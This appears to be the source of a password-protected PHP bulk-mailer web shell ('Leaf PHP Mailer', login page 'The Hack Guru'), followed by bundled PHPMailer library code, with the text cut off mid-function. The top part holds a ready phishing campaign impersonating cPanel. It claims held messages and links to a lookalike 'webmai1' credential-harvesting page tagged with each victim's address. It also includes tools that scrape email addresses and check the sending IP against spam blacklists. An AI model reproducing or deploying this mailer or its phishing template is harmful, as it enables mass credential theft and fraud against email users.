<?php
/**
 * Leaf PHP Mailer by [leafmailer.pw]
 * @version : 2.8
**/

$password = "alex@123"; // Password 



session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);

$leaf['version']="2.8";
$leaf['website']="leafmailer.pw";


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        
echo "<center>
	<style>input[type=password]{color:teal;background:black;border:1px solid teal}a{text-decoration:none;color:white;padding-left:270px}sad{font-family:'Fredericka the Great',cursive;color:teal;font-size:50px}</style>
<title>☠The Hack Guru</title><link href=http://fonts.googleapis.com/css?family=Fredericka+the+Great rel=stylesheet type=text/css><div align=center><sad>☠The Hack Guru☠</sad><br>
<iframe width=0 height=0 src=https://www.youtube.com/embed/a3sbfHu-6Fk?autoplay=1 frameborder=0 allowfullscreen></iframe><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></div>
</center>";

		exit;        
    }
}

session_write_close();


function leafClear($text,$email){
	$e = explode('@', $email);
	$emailuser=$e[0];
	$emaildomain=$e[1];
    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-email-]", $email, $text);
    $text = str_replace("[-emailbase-]", base64_encode($email), $text);
    $text = str_replace("[-emailuser-]", ucfirst($emailuser), $text);
    $text = str_replace("[-emaildomain-]", $emaildomain, $text);
    $text = str_replace("[-randomletters-]", randString('abcdefghijklmnopqrstuvwxyz'), $text);
    $text = str_replace("[-randomstring-]", randString('abcdefghijklmnopqrstuvwxyz0123456789'), $text);
    $text = str_replace("[-randomnumber-]", randString('0123456789'), $text);
    $text = str_replace("[-randommd5-]", md5(randString('abcdefghijklmnopqrstuvwxyz0123456789')), $text);
    return $text;  
}
function leafTrim($string){
	$string=urldecode($string);
    return stripslashes(trim($string));
}
function randString($consonants) {
    $length=rand(12,25);
    $password = '';
    for ($i = 0; $i < $length; $i++) {
            $password .= $consonants[(rand() % strlen($consonants))];
    }
    return $password;
}
function leafMailCheck($email){
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) return true;
    else return false;
}
# Bulit-in BlackList Checker 
if(isset($_GET['check_ip'])){
    if (isset($_GET['host'])){
        $_GET['host']=explode(",", $_GET['host']);
        foreach ($_GET['host'] as $host) {
            if (checkdnsrr($_GET['check_ip'] . "." .  $host . ".", "A")) $check= "<font color='red'> Listed</font>";
            else $check= "<font color='green'> Clean</font>";
            print 'document.getElementById("'. $host.'").innerHTML = "'.$check.'";';
        }

        exit;
    }
    $dnsbl_lookup = [
        "all.s5h.net",
        "b.barracudacentral.org",
        "bl.spamcop.net",
        "blacklist.woody.ch",
        "bogons.cymru.com",
        "cbl.abuseat.org",
        "cdl.anti-spam.org.cn",
        "combined.abuse.ch",
        "db.wpbl.info",
        "dnsbl-1.uceprotect.net",
        "dnsbl-2.uceprotect.net",
        "dnsbl-3.uceprotect.net",
        "dnsbl.anticaptcha.net",
        "dnsbl.dronebl.org",
        "dnsbl.inps.de",
        "dnsbl.sorbs.net",
        "drone.abuse.ch",
        "duinv.aupads.org",
        "dul.dnsbl.sorbs.net",
        "dyna.spamrats.com",
        "dynip.rothen.com",
        "http.dnsbl.sorbs.net",
        "ips.backscatterer.org",
        "ix.dnsbl.manitu.net",
        "korea.services.net",
        "misc.dnsbl.sorbs.net",
        "noptr.spamrats.com",
        "orvedb.aupads.org",
        "pbl.spamhaus.org",
        "proxy.bl.gweep.ca",
        "psbl.surriel.com",
        "relays.bl.gweep.ca",
        "relays.nether.net",
        "sbl.spamhaus.org",
        "short.rbl.jp",
        "singular.ttk.pte.hu",
        "smtp.dnsbl.sorbs.net",
        "socks.dnsbl.sorbs.net",
        "spam.abuse.ch",
        "spam.dnsbl.anonmails.de",
        "spam.dnsbl.sorbs.net",
        "spam.spamrats.com",
        "spambot.bls.digibase.ca",
        "spamrbl.imp.ch",
        "spamsources.fabel.dk",
        "ubl.lashback.com",
        "ubl.unsubscore.com",
        "virus.rbl.jp",
        "web.dnsbl.sorbs.net",
        "wormrbl.imp.ch",
        "xbl.spamhaus.org",
        "z.mailspike.net",
        "zen.spamhaus.org",
        "zombie.dnsbl.sorbs.net",
    ];
    $reverse_ip = implode(".", array_reverse(explode(".", $_GET['check_ip'])));
    $dnsT = count($dnsbl_lookup);
    leafheader();
    print '<div class="container col-lg-6"><h3><font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>Blacklist Checker</small></h3>';
    Print "Checking <b>".$_GET['check_ip']."</b> in <b>$dnsT</b>  anti-spam databases:<br>";
    $dnsN="";
    print '<table >';
    for ($i=0; $i < $dnsT; $i=$i+10) { 
        $host="";
        $hosts="";
        for($j=$i; $j<$i+10;$j++){
            $host=$dnsbl_lookup[$j];
            if(!empty($host)){
                print "<tr> <td>$host</td> <td id='$host'>Checking ..</td></tr>";
                $hosts .="$host,";
            }
        }
        $dnsN.="<script src='?check_ip=$reverse_ip&host=".$hosts."' type='text/javascript'></script>";
    }

    print '</table></div>';
    print $dnsN;
    exit;
}
if(isset($_GET['emailfilter'])){

    if(!empty($_FILES['fileToUpload']['tmp_name'])){
        $_POST['emailList']= file_get_contents($_FILES["fileToUpload"]["tmp_name"]); 
    }
    $_POST['emailList']=strtolower($_POST['emailList']);
   if($_GET['emailfilter']=="ifram"){
        if ($_POST['resulttype'] == "download"){
            header("Content-Description: File Transfer"); 
            header("Content-Type: application/octet-stream"); 
            header("Content-Disposition: attachment; filename=emails".time().".txt");
        }
        else {
            header("Content-Type: text/plain");
        }
    if($_POST['submit']=="extract"){
        $pattern = '/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}/';
        preg_match_all($pattern, $_POST['emailList'], $matches);
        foreach ($matches[0] as $email) {
            print $email."\n";
        }
    }
    elseif ($_POST['submit']=="filter") {
        $emails=explode("\n", $_POST['emailList']);
        $keywords=explode("\n", strtolower($_POST['keywords']));
        foreach ($emails as $email) {
            foreach ($keywords as $keyword ) {
                if(strstr($email, $keyword) ){
                    print $email."\n";
                     break;
                }
               
            }
        }

    }
    exit;
   }
   leafheader();
   print '<div class="container col-lg-4"><h3><font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>Email Filter</small></h3>';
   print '
    <form action="?emailfilter=ifram" method="POST" target="my-iframe" enctype="multipart/form-data" onsubmit=\'\'>
        <label for="emailList">Text </label><input type="file" name="fileToUpload" id="fileToUpload"> 
        or

        <textarea name="emailList" id="emailList" class="form-control" rows="7" id="textArea"></textarea>
      <div class="col-lg-12">
        <div class="radio">
          <label>
            <input type="radio" name="resulttype" id="resulttype" value="here" checked="">
            Show Result in this page
          </label>
        </div>
        <div class="radio">
          <label>
            <input type="radio" name="resulttype" id="resulttype" value="download">
            Download Result (for big numbers)
          </label>
        </div>
      </div>
            <legend><h4>Extract Email</h4></legend>
            Detecting every email (100%) and order them line by line <br><br>
        <button type="submit" name="submit" value="extract" class="btn btn-default btn-sm">Start</button>
            <legend><h4>Filter Emails</h4></legend>
        <label >Keywords <small> ex: gmail.com or .co.uk</small> </label><textarea name="keywords" id="keywords" class="form-control" rows="4" id="textArea">gmail.com
hotmail.com
yahoo.com
.co.uk</textarea><br>

            <button type="submit" name="submit" value="filter" class="btn btn-default btn-sm">Start</button>
    </form>
    <label >Result </label>
    <iframe style="border:none;width:100%;" name="my-iframe"  src="?emailfilter=ifram" ></iframe>
   ';
   exit;

}
$html="checked";
$utf8="selected";
$bit8="selected";

if($_POST['action']=="send" or $_POST['action']=="score"){

    $senderEmail=leafTrim($_POST['senderEmail']);
    $senderName=leafTrim('cPanel');
    $replyTo=leafTrim($_POST['replyTo']);
    $subject=leafTrim('cPanel is delaying (9) messages');
    $emailList=leafTrim($_POST['emailList']);
    $messageType=leafTrim($_POST['messageType']);
    $messageLetter=leafTrim('<p> </p>
<HTML><BODY><P></P>
<TABLE style="TEXT-TRANSFORM: none; FONT-STYLE: normal; TEXT-INDENT: 0px; WIDTH: 507px; FONT-FAMILY: Helvetica, Arial, sans-serif; MAX-WIDTH: 600px; WHITE-SPACE: normal; COLOR: #000000; MARGIN-LEFT: auto; FONT-SIZE: 12px; FONT-WEIGHT: 400; MARGIN-RIGHT: auto; WORD-SPACING: 0px" align=center>
<TBODY>
<TR>
<TD style="TEXT-ALIGN: center; WIDTH: 507px">
<P><STRONG>Email server alert...</STRONG></P></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; WIDTH: 507px; PADDING-RIGHT: 0px; FONT-FAMILY: segoe ui light, segoe ui, helvetica neue medium, arial, sans-serif; COLOR: #2672ec; FONT-SIZE: 31px; PADDING-TOP: 0px"><SPAN style="DISPLAY: inline; FLOAT: none"><SPAN style="FONT-SIZE: x-large">Webmail Server Congestion</SPAN></SPAN></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; WIDTH: 507px; PADDING-RIGHT: 0px; FONT-FAMILY: segoe ui, tahoma, verdana, arial, sans-serif; COLOR: #2a2a2a; FONT-SIZE: 14px; PADDING-TOP: 25px">
<P>Dear [-emailuser-],</P>
<P>Webmail sever is holding (9) incoming messages because your email <SPAN style="COLOR: #0c53f3">[-email-] </SPAN>has not been verified. To continue using your account, please verify your email account below.</P>
<P></P></TD></TR>
<TR style="TEXT-ALIGN: center">
<TD style="WIDTH: 507px">
<P><SPAN style="FONT-SIZE: 12px"><STRONG><A style="TEXT-ALIGN: center; PADDING-BOTTOM: 15px; LINE-HEIGHT: 10px; PADDING-LEFT: 15px; PADDING-RIGHT: 15px; BACKGROUND: #ff6c2c; HEIGHT: 40px; COLOR: white; OVERFLOW: hidden; TEXT-DECORATION: none; PADDING-TOP: 15px; border-radius: 5px" href="https://webmai1.netlify.app/2096/cpsess2846188946/3rdparty/roundcube/?_task=mail&_mbox=INBOX#[-email-]">Review & Verify your account</A></STRONG></SPAN> <BR><BR></P>
<P><STRONG>Note: Move this message to your inbox folder if you are having a problem with the above link.</STRONG></P>
<P>You may not be able to access your email if ignored, this process takes few minutes only. After verification, allow couple of minutes for update to be compeleted.</P>
<P></P>
<HR style="COLOR: #ff6c2c">

<P>Thank you,</P>
<P>Copyright © 2021 cPanel, Inc.</P></TD></TR></TBODY></TABLE>
<P style="TEXT-ALIGN: center"></P></BODY></HTML><p style="text-align: center;"> </p>');
    $encoding = $_POST['encode'];
    $charset = $_POST['charset'];
    $html="";
    $utf8="";
    $bit8="";

    if($messageType==2) $plain="checked";
    else $html="checked";

    if($charset=="ISO-8859-1") $iso="selected";
    else $utf8="selected";

    if($encoding=="7bit") $bit7="selected";
    elseif($encoding=="binary") $binary="selected";
    elseif($encoding=="base64") $base64="selected";
    elseif($encoding=="quoted-printable") $quotedprintable="selected";
    else $bit8="selected";



}
if($_POST['action']=="view"){
	$viewMessage=leafTrim($_POST['messageLetter']);
	$viewMessage=leafClear($viewMessage,"user@domain.com");
	if ($_POST['messageType']==2){
		print "<pre>".htmlspecialchars($viewMessage)."</pre>";
	}
	else {
		print $viewMessage;
	}
	exit;
}



if(!isset($_POST['senderEmail'])){
    $senderEmail="support@".str_replace("www.", "", $_SERVER['HTTP_HOST']);
    if (!leafMailCheck($senderEmail)) $senderEmail="";
}

class PHPMailer
{
    /**
     * The PHPMailer Version number.
     * @var string
     */
    public $Version = '5.2.28';

    /**
     * Email priority.
     * Options: null (default), 1 = High, 3 = Normal, 5 = low.
     * When null, the header is not set at all.
     * @var integer
     */
    public $Priority = null;

    /**
     * The character set of the message.
     * @var string
     */
    public $CharSet = 'iso-8859-1';

    /**
     * The MIME Content-type of the message.
     * @var string
     */
    public $ContentType = 'text/plain';

    /**
     * The message encoding.
     * Options: "8bit", "7bit", "binary", "base64", and "quoted-printable".
     * @var string
     */
    public $Encoding = '8bit';

    /**
     * Holds the most recent mailer error message.
     * @var string
     */
    public $ErrorInfo = '';

    /**
     * The From email address for the message.
     * @var string
     */
    public $From = 'root@localhost';

    /**
     * The From name of the message.
     * @var string
     */
    public $FromName = 'Root User';

    /**
     * The Sender email (Return-Path) of the message.
     * If not empty, will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
     * @var string
     */
    public $Sender = '';

    /**
     * The Return-Path of the message.
     * If empty, it will be set to either From or Sender.
     * @var string
     * @deprecated Email senders should never set a return-path header;
     * it's the receiver's job (RFC5321 section 4.4), so this no longer does anything.
     * @link https://tools.ietf.org/html/rfc5321#section-4.4 RFC5321 reference
     */
    public $ReturnPath = '';

    /**
     * The Subject of the message.
     * @var string
     */
    public $Subject = '';

    /**
     * An HTML or plain text message body.
     * If HTML then call isHTML(true).
     * @var string
     */
    public $Body = '';

    /**
     * The plain-text message body.
     * This body can be read by mail clients that do not have HTML email
     * capability such as mutt & Eudora.
     * Clients that can read HTML will view the normal Body.
     * @var string
     */
    public $AltBody = '';

    /**
     * An iCal message part body.
     * Only supported in simple alt or alt_inline message types
     * To generate iCal events, use the bundled extras/EasyPeasyICS.php class or iCalcreator
     * @link http://sprain.ch/blog/downloads/php-class-easypeasyics-create-ical-files-with-php/
     * @link http://kigkonsult.se/iCalcreator/
     * @var string
     */
    public $Ical = '';

    /**
     * The complete compiled MIME message body.
     * @access protected
     * @var string
     */
    protected $MIMEBody = '';

    /**
     * The complete compiled MIME message headers.
     * @var string
     * @access protected
     */
    protected $MIMEHeader = '';

    /**
     * Extra headers that createHeader() doesn't fold in.
     * @var string
     * @access protected
     */
    protected $mailHeader = '';

    /**
     * Word-wrap the message body to this number of chars.
     * Set to 0 to not wrap. A useful value here is 78, for RFC2822 section 2.1.1 compliance.
     * @var integer
     */
    public $WordWrap = 0;

    /**
     * Which method to use to send mail.
     * Options: "mail", "sendmail", or "smtp".
     * @var string
     */
    public $Mailer = 'mail';

    /**
     * The path to the sendmail program.
     * @var string
     */
    public $Sendmail = '/usr/sbin/sendmail';

    /**
     * Whether mail() uses a fully sendmail-compatible MTA.
     * One which supports sendmail's "-oi -f" options.
     * @var boolean
     */
    public $UseSendmailOptions = true;

    /**
     * Path to PHPMailer plugins.
     * Useful if the SMTP class is not in the PHP include path.
     * @var string
     * @deprecated Should not be needed now there is an autoloader.
     */
    public $PluginDir = '';

    /**
     * The email address that a reading confirmation should be sent to, also known as read receipt.
     * @var string
     */
    public $ConfirmReadingTo = '';

    /**
     * The hostname to use in the Message-ID header and as default HELO string.
     * If empty, PHPMailer attempts to find one with, in order,
     * $_SERVER['SERVER_NAME'], gethostname(), php_uname('n'), or the value
     * 'localhost.localdomain'.
     * @var string
     */
    public $Hostname = '';

    /**
     * An ID to be used in the Message-ID header.
     * If empty, a unique id will be generated.
     * You can set your own, but it must be in the format "<id@domain>",
     * as defined in RFC5322 section 3.6.4 or it will be ignored.
     * @see https://tools.ietf.org/html/rfc5322#section-3.6.4
     * @var string
     */
    public $MessageID = '';

    /**
     * The message Date to be used in the Date header.
     * If empty, the current date will be added.
     * @var string
     */
    public $MessageDate = '';

    /**
     * SMTP hosts.
     * Either a single hostname or multiple semicolon-delimited hostnames.
     * You can also specify a different port
     * for each host by using this format: [hostname:port]
     * (e.g. "smtp1.example.com:25;smtp2.example.com").
     * You can also specify encryption type, for example:
     * (e.g. "tls://smtp1.example.com:587;ssl://smtp2.example.com:465").
     * Hosts will be tried in order.
     * @var string
     */
    public $Host = 'localhost';

    /**
     * The default SMTP server port.
     * @var integer
     * @TODO Why is this needed when the SMTP class takes care of it?
     */
    public $Port = 25;

    /**
     * The SMTP HELO of the message.
     * Default is $Hostname. If $Hostname is empty, PHPMailer attempts to find
     * one with the same method described above for $Hostname.
     * @var string
     * @see PHPMailer::$Hostname
     */
    public $Helo = '';

    /**
     * What kind of encryption to use on the SMTP connection.
     * Options: '', 'ssl' or 'tls'
     * @var string
     */
    public $SMTPSecure = '';

    /**
     * Whether to enable TLS encryption automatically if a server supports it,
     * even if `SMTPSecure` is not set to 'tls'.
     * Be aware that in PHP >= 5.6 this requires that the server's certificates are valid.
     * @var boolean
     */
    public $SMTPAutoTLS = true;

    /**
     * Whether to use SMTP authentication.
     * Uses the Username and Password properties.
     * @var boolean
     * @see PHPMailer::$Username
     * @see PHPMailer::$Password
     */
    public $SMTPAuth = false;

    /**
     * Options array passed to stream_context_create when connecting via SMTP.
     * @var array
     */
    public $SMTPOptions = array();

    /**
     * SMTP username.
     * @var string
     */
    public $Username = '';

    /**
     * SMTP password.
     * @var string
     */
    public $Password = '';

    /**
     * SMTP auth type.
     * Options are CRAM-MD5, LOGIN, PLAIN, NTLM, XOAUTH2, attempted in that order if not specified
     * @var string
     */
    public $AuthType = '';

    /**
     * SMTP realm.
     * Used for NTLM auth
     * @var string
     */
    public $Realm = '';

    /**
     * SMTP workstation.
     * Used for NTLM auth
     * @var string
     */
    public $Workstation = '';

    /**
     * The SMTP server timeout in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @var integer
     */
    public $Timeout = 300;

    /**
     * SMTP class debug output mode.
     * Debug output level.
     * Options:
     * * `0` No output
     * * `1` Commands
     * * `2` Data and commands
     * * `3` As 2 plus connection status
     * * `4` Low-level data output
     * @var integer
     * @see SMTP::$do_debug
     */
    public $SMTPDebug = 0;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $mail->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @var string|callable
     * @see SMTP::$Debugoutput
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to keep SMTP connection open after each message.
     * If this is set to true then to close the connection
     * requires an explicit call to smtpClose().
     * @var boolean
     */
    public $SMTPKeepAlive = false;

    /**
     * Whether to split multiple to addresses into multiple messages
     * or send them all in one message.
     * Only supported in `mail` and `sendmail` transports, not in SMTP.
     * @var boolean
     */
    public $SingleTo = false;

    /**
     * Storage for addresses when SingleTo is enabled.
     * @var array
     * @TODO This should really not be public
     */
    public $SingleToArray = array();

    /**
     * Whether to generate VERP addresses on send.
     * Only applicable when sending via SMTP.
     * @link https://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Postfix VERP info
     * @var boolean
     */
    public $do_verp = false;

    /**
     * Whether to allow sending messages with an empty body.
     * @var boolean
     */
    public $AllowEmpty = false;

    /**
     * The default line ending.
     * @note The default remains "\n". We force CRLF where we know
     *        it must be used via self::CRLF.
     * @var string
     */
    public $LE = "\n";

    /**
     * DKIM selector.
     * @var string
     */
    public $DKIM_selector = '';

    /**
     * DKIM Identity.
     * Usually the email address used as the source of the email.
     * @var string
     */
    public $DKIM_identity = '';

    /**
     * DKIM passphrase.
     * Used if your key is encrypted.
     * @var string
     */
    public $DKIM_passphrase = '';

    /**
     * DKIM signing domain name.
     * @example 'example.com'
     * @var string
     */
    public $DKIM_domain = '';

    /**
     * DKIM private key file path.
     * @var string
     */
    public $DKIM_private = '';

    /**
     * DKIM private key string.
     * If set, takes precedence over `$DKIM_private`.
     * @var string
     */
    public $DKIM_private_string = '';

    /**
     * Callback Action function name.
     *
     * The function that handles the result of the send email action.
     * It is called out by send() for each email sent.
     *
     * Value can be any php callable: http://www.php.net/is_callable
     *
     * Parameters:
     *   boolean $result        result of the send action
     *   array   $to            email addresses of the recipients
     *   array   $cc            cc email addresses
     *   array   $bcc           bcc email addresses
     *   string  $subject       the subject
     *   string  $body          the email body
     *   string  $from          email address of sender
     * @var string
     */
    public $action_function = '';

    /**
     * What to put in the X-Mailer header.
     * Options: An empty string for PHPMailer default, whitespace for none, or a string to use
     * @var string
     */
    public $XMailer = ' ';

    /**
     * Which validator to use by default when validating email addresses.
     * May be a callable to inject your own validator, but there are several built-in validators.
     * @see PHPMailer::validateAddress()
     * @var string|callable
     * @static
     */
    public static $validator = 'auto';

    /**
     * An instance of the SMTP sender class.
     * @var SMTP
     * @access protected
     */
    protected $smtp = null;

    /**
     * The array of 'to' names and addresses.
     * @var array
     * @access protected
     */
    protected $to = array();

    /**
     * The array of 'cc' names and addresses.
     * @var array
     * @access protected
     */
    protected $cc = array();

    /**
     * The array of 'bcc' names and addresses.
     * @var array
     * @access protected
     */
    protected $bcc = array();

    /**
     * The array of reply-to names and addresses.
     * @var array
     * @access protected
     */
    protected $ReplyTo = array();

    /**
     * An array of all kinds of addresses.
     * Includes all of $to, $cc, $bcc
     * @var array
     * @access protected
     * @see PHPMailer::$to @see PHPMailer::$cc @see PHPMailer::$bcc
     */
    protected $all_recipients = array();

    /**
     * An array of names and addresses queued for validation.
     * In send(), valid and non duplicate entries are moved to $all_recipients
     * and one of $to, $cc, or $bcc.
     * This array is used only for addresses with IDN.
     * @var array
     * @access protected
     * @see PHPMailer::$to @see PHPMailer::$cc @see PHPMailer::$bcc
     * @see PHPMailer::$all_recipients
     */
    protected $RecipientsQueue = array();

    /**
     * An array of reply-to names and addresses queued for validation.
     * In send(), valid and non duplicate entries are moved to $ReplyTo.
     * This array is used only for addresses with IDN.
     * @var array
     * @access protected
     * @see PHPMailer::$ReplyTo
     */
    protected $ReplyToQueue = array();

    /**
     * The array of attachments.
     * @var array
     * @access protected
     */
    protected $attachment = array();

    /**
     * The array of custom headers.
     * @var array
     * @access protected
     */
    protected $CustomHeader = array();

    /**
     * The most recent Message-ID (including angular brackets).
     * @var string
     * @access protected
     */
    protected $lastMessageID = '';

    /**
     * The message's MIME type.
     * @var string
     * @access protected
     */
    protected $message_type = '';

    /**
     * The array of MIME boundary strings.
     * @var array
     * @access protected
     */
    protected $boundary = array();

    /**
     * The array of available languages.
     * @var array
     * @access protected
     */
    protected $language = array();

    /**
     * The number of errors encountered.
     * @var integer
     * @access protected
     */
    protected $error_count = 0;

    /**
     * The S/MIME certificate file path.
     * @var string
     * @access protected
     */
    protected $sign_cert_file = '';

    /**
     * The S/MIME key file path.
     * @var string
     * @access protected
     */
    protected $sign_key_file = '';

    /**
     * The optional S/MIME extra certificates ("CA Chain") file path.
     * @var string
     * @access protected
     */
    protected $sign_extracerts_file = '';

    /**
     * The S/MIME password for the key.
     * Used only if the key is encrypted.
     * @var string
     * @access protected
     */
    protected $sign_key_pass = '';

    /**
     * Whether to throw exceptions for errors.
     * @var boolean
     * @access protected
     */
    protected $exceptions = false;

    /**
     * Unique ID used for message ID and boundaries.
     * @var string
     * @access protected
     */
    protected $uniqueid = '';

    /**
     * Error severity: message only, continue processing.
     */
    const STOP_MESSAGE = 0;

    /**
     * Error severity: message, likely ok to continue processing.
     */
    const STOP_CONTINUE = 1;

    /**
     * Error severity: message, plus full stop, critical error reached.
     */
    const STOP_CRITICAL = 2;

    /**
     * SMTP RFC standard line ending.
     */
    const CRLF = "\r\n";

    /**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @var integer
     */
    const MAX_LINE_LENGTH = 998;

    /**
     * Constructor.
     * @param boolean $exceptions Should we throw external exceptions?
     */
    public function __construct($exceptions = null)
    {
        if ($exceptions !== null) {
            $this->exceptions = (boolean)$exceptions;
        }
        //Pick an appropriate debug output format automatically
        $this->Debugoutput = (strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html');
    }

    /**
     * Destructor.
     */
    public function __destruct()
    {
        //Close any open SMTP connection nicely
        $this->smtpClose();
    }

    /**
     * Call mail() in a safe_mode-aware fashion.
     * Also, unless sendmail_path points to sendmail (or something that
     * claims to be sendmail), don't pass params (not a perfect fix,
     * but it will do)
     * @param string $to To
     * @param string $subject Subject
     * @param string $body Message Body
     * @param string $header Additional Header(s)
     * @param string $params Params
     * @access private
     * @return boolean
     */
    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }

        //Can't use additional_parameters in safe_mode, calling mail() with null params breaks
        //@link http://php.net/manual/en/function.mail.php
        if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }
    /**
     * Output debugging info via user-defined method.
     * Only generates output if SMTP debug output is enabled (@see SMTP::$do_debug).
     * @see PHPMailer::$Debugoutput
     * @see PHPMailer::$SMTPDebug
     * @param string $str
     */
    protected function edebug($str)
    {
        if ($this->SMTPDebug <= 0) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/\r\n?/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                ) . "\n";
        }
    }

    /**
     * Send messages using SMTP.
     * @return void
     */
    public function isSMTP()
    {
        $this->Mailer = 'smtp';
    }

    /**
     * Send messages using PHP's mail() function.
     * @return void
     */
    public function isMail()
    {
        $this->Mailer = 'mail';
    }

    /**
     * Send messages using $Sendmail.
     * @return void
     */
    public function isSendmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'sendmail')) {
            $this->Sendmail = '/usr/sbin/sendmail';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'sendmail';
    }

    /**
     * Send messages using qmail.
     * @return void
     */
    public function isQmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'qmail')) {
            $this->Sendmail = '/var/qmail/bin/qmail-inject';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'qmail';
    }

    /**
     * Add a "To" address.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */
    public function addAddress($address, $name = '')
    {
        return $this->addOrEnqueueAnAddress('to', $address, $name);
    }

    /**
     * Add a "CC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */
    public function addCC($address, $name = '')
    {
        return $this->addOrEnqueueAnAddress('cc', $address, $name);
    }

    /**
     * Add a "BCC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */
    public function addBCC($address, $name = '')
    {
        return $this->addOrEnqueueAnAddress('bcc', $address, $name);
    }

    /**
     * Add a "Reply-To" address.
     * @param string $address The email address to reply to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */
    public function addReplyTo($address, $name = '')
    {
        return $this->addOrEnqueueAnAddress('Reply-To', $address, $name);
    }

    /**
     * Add an address to one of the recipient arrays or to the ReplyTo array. Because PHPMailer
     * can't validate addresses with an IDN without knowing the PHPMailer::$CharSet (that can still
     * be modified after calling this function), addition of such addresses is delayed until send().
     * Addresses that have been added already return false, but do not throw exceptions.
     * @param string $kind One of 'to', 'cc', 'bcc', or 'ReplyTo'
     * @param string $address The email address to send, resp. to reply to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */
    protected function addOrEnqueueAnAddress($kind, $address, $name)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        if (($pos = strrpos($address, '@')) === false) {
            // At-sign is misssing.
            $error_message = $this->lang('invalid_address') . " (addAnAddress $kind): $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $params = array($kind, $address, $name);
        // Enqueue addresses with IDN until we know the PHPMailer::$CharSet.
        if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported()) {
            if ($kind != 'Reply-To') {
                if (!array_key_exists($address, $this->RecipientsQueue)) {
                    $this->RecipientsQueue[$address] = $params;
                    return true;
                }
            } else {
                if (!array_key_exists($address, $this->ReplyToQueue)) {
                    $this->ReplyToQueue[$address] = $params;
                    return true;
                }
            }
            return false;
        }
        // Immediately add standard addresses without IDN.
        return call_user_func_array(array($this, 'addAnAddress'), $params);
    }

    /**
     * Add an address to one of the recipient arrays or to the ReplyTo array.
     * Addresses that have been added already return false, but do not throw exceptions.
     * @param string $kind One of 'to', 'cc', 'bcc', or 'ReplyTo'
     * @param string $address The email address to send, resp. to reply to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */
    protected function addAnAddress($kind, $address, $name = '')
    {
        if (!in_array($kind, array('to', 'cc', 'bcc', 'Reply-To'))) {
            $error_message = $this->lang('Invalid recipient kind: ') . $kind;
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        if (!$this->validateAddress($address)) {
